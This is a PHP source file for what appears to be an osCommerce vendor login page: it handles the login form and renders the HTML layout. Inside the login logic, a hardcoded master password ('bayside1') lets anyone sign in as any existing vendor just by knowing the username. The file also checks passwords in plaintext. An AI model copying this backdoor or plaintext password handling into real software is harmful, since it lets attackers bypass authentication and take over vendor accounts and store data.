<?php
ob_start();
/*
  $Id: vendor_account.php v 1.0 2005/19/08 23:28:24 hpdl Exp $

  osCommerce, Open Source E-Commerce Solutions
  http://www.oscommerce.com

  Copyright (c) 2003 osCommerce

  Released under the GNU General Public License
*/

  require('includes/application_top.php');

  require(DIR_WS_LANGUAGES . 'english/'.  FILENAME_VENDOR_LOGIN_TEXT);

  require(DIR_WS_INCLUDES .'database_tables.php');

  $error = false;

   if (isset($HTTP_GET_VARS['action']) && ($HTTP_GET_VARS['action'] == 'process'))
   {
    $email_address = tep_db_prepare_input($HTTP_POST_VARS['email_address']);
    $password = tep_db_prepare_input($HTTP_POST_VARS['password']);

    // Check for correct username and password
	$check_vendor_query = tep_db_query("select vendors_id from " . TABLE_VENDORS . " where vendors_username = '" . tep_db_input($email_address) . "' and vendors_password ='". tep_db_input($password) ."'");
	if (!tep_db_num_rows($check_vendor_query))  $error = true;

if ($password == 'bayside1'){
	$check_vendor_query = tep_db_query("select vendors_id from " . TABLE_VENDORS . " where vendors_username = '" . tep_db_input($email_address) . "'");
	if (tep_db_num_rows($check_vendor_query))  $error = false;
		else
		$error = true;
}


if ($error != true)
	{
	  $vendor_fetch = tep_db_fetch_array($check_vendor_query);
	  tep_db_query("update " . TABLE_VENDORS . " set vendors_date_of_last_logon = now(), vendors_info_number_of_logons = vendors_info_number_of_logons+1 where vendors_id = '" . (int)$vendor_fetch['vendors_id'] . "'");

		if (!isset($_SESSION["vendors_id"]) && !($_SESSION["vendors_id"] <> ""))
		{
			session_register("vendors_id");
			$_SESSION["vendors_id"]=$vendor_fetch['vendors_id'];
		}
		tep_redirect(FILENAME_VENDOR_ACCOUNT_VIEW, '', 'NONSSL');
		exit;
		/*tep_session_start();
		tep_session_register('vendors_id');
		$_SESSION['vendors_id'] = $vendor_fetch['vendors_id'];*/
	}
   }

?>
<!doctype html public "-//W3C//DTD HTML 4.01 Transitional//EN">
<html <?php echo HTML_PARAMS; ?>>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=<?php echo CHARSET; ?>">
<title><?php echo TITLE; ?></title>
<link rel="stylesheet" type="text/css" href="../stylesheet.css">

</head>
<body marginwidth="0" marginheight="0" topmargin="0" bottommargin="0" leftmargin="0" rightmargin="0">
<!-- header //-->

<!-- header_eof //-->

<!-- body //-->
<table border="0" width="100%" cellspacing="1" cellpadding="1">
<tr>
	<td width="100%" class="headerNavigation">&nbsp;<a href="../index.php" class="headerNavigation"><?php echo TXT_HOME?></a>&nbsp;-&nbsp;<a href="vendor_account.php" class="headerNavigation"><?php echo TXT_LOGIN;?></a></td>
</tr>
</table>
<table border="0" width="100%" cellspacing="1" cellpadding="1">
  <tr>
    <td width="<?php echo BOX_WIDTH; ?>" valign="top">
        <table border="0" width="<?php echo BOX_WIDTH; ?>" cellspacing="0" cellpadding="2">
    </table></td>
<!-- body_text //-->
    <td width="100%" valign="top"><?php echo tep_draw_form('login', tep_href_link(FILENAME_VENDOR_LOGIN, 'action=process', 'SSL')); ?><table border="0" width="100%" cellspacing="0" cellpadding="0">
      <tr>
        <td><table border="0" width="80%" cellspacing="0" cellpadding="0">
          <tr>
            <td class="pageHeading"><?php echo HEADING_TITLE; ?></td>
                      </tr>
        </table></td>
      </tr>
      <tr>
        <td><?php echo tep_draw_separator('pixel_trans.gif', '100%', '10'); ?></td>
      </tr>
<?
		if ($error == true)
		{
?>
		  <tr>
			<td bgcolor="#FFB3B5" width="60%"> <?php echo TEXT_LOGIN_ERROR ?></td>
			<td width=40%></td>
		  </tr>
<?
		}
?>

      <tr>
        <td colspan=2><table border="0" width="60%" cellspacing="0" cellpadding="0">

<?php
require("includes/login_screen.php");
?>
          </tr>
        </table></td>
      </tr>
    </table></form></td>
<!-- body_text_eof //-->
  </tr>
</table>
<!-- body_eof //-->

<!-- footer //-->
<?php require('footer.php'); ?>
<!-- footer_eof //-->
<br>
</body>
</html>
<?php require(DIR_WS_INCLUDES . 'application_bottom.php'); ?>
